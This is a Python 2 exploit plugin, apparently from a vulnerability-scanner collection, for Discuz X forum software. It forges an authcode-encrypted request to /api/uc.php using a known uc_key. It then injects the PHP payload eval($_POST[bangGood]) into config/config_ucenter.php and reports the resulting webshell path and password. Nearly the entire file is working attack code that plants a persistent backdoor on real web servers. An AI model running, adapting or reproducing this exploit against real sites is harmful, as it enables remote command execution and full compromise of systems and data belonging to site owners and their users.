# coding=utf-8
import hashlib
import time
import math
import base64
import urllib
import urllib2
import sys


def get_plugin_info():
    plugin_info = {
        "name": "Discuz getshell",
        "info": "在/config/config_ucenter.php中获取的webshell，以执行任意的shell命令,最终完全控制目标系统",
        "level": "紧急",
        "type": "命令执行",
        "author": "muYoz@bg",
        "url": "https://github.com/ym2011/POC-EXP/blob/master/Discuz/DiscuzX1.5X2.5X3%20uc_key%20getshell/",
        "keyword": "tag:discuz",
        "source": 1
    }
    return plugin_info


def microtime(get_as_float=False):
    if get_as_float:
        return time.time()
    else:
        return '%.8f %d' % math.modf(time.time())


def get_authcode(string, key=''):
    ckey_length = 4
    key = hashlib.md5(key).hexdigest()
    keya = hashlib.md5(key[0:16]).hexdigest()
    keyb = hashlib.md5(key[16:32]).hexdigest()
    keyc = (hashlib.md5(microtime()).hexdigest())[-ckey_length:]
    # keyc = (hashlib.md5('0.736000 1389448306').hexdigest())[-ckey_length:]
    cryptkey = keya + hashlib.md5(keya + keyc).hexdigest()

    key_length = len(cryptkey)
    string = '0000000000' + (hashlib.md5(string + keyb)).hexdigest()[0:16] + string
    string_length = len(string)
    result = ''
    box = range(0, 256)
    rndkey = dict()
    for i in range(0, 256):
        rndkey[i] = ord(cryptkey[i % key_length])
    j = 0
    for i in range(0, 256):
        j = (j + box[i] + rndkey[i]) % 256
        tmp = box[i]
        box[i] = box[j]
        box[j] = tmp
    a = 0
    j = 0
    for i in range(0, string_length):
        a = (a + 1) % 256
        j = (j + box[a]) % 256
        tmp = box[a]
        box[a] = box[j]
        box[j] = tmp
        result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))
    return keyc + base64.b64encode(result).replace('=', '')

def check(ip, port, key):
    host = ip + ':'+port
    url = host + '/api/uc.php'
    '''
    webshell
        '''
    headers = {'Accept-Language': 'zh-cn',
               'Content-Type': 'application/x-www-form-urlencoded',
               'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)',
               'Referer': url
               }
    tm = time.time() + 10 * 3600
    tm = "time=%d&action=updateapps" % tm
    code = urllib.quote(get_authcode(tm, key))
    url = url + "?code=" + code
    data1 = '''<?xml version="1.0" encoding="ISO-8859-1"?>
                <root>
                <item id="UC_API">http://xxx\');eval($_POST[bangGood]);//</item>
                </root>'''
    try:
        req = urllib2.Request(url, data=data1, headers=headers)
        ret = urllib2.urlopen(req)
    except:
        pass
    data2 = '''<?xml version="1.0" encoding="ISO-8859-1"?>
                <root>
                <item id="UC_API">http://aaa</item>
                </root>'''
    try:
        req = urllib2.Request(url, data=data2, headers=headers)
        ret = urllib2.urlopen(req)
    except:
        pass
    return u"webshell:/config/config_ucenter.php,password:bangGood"
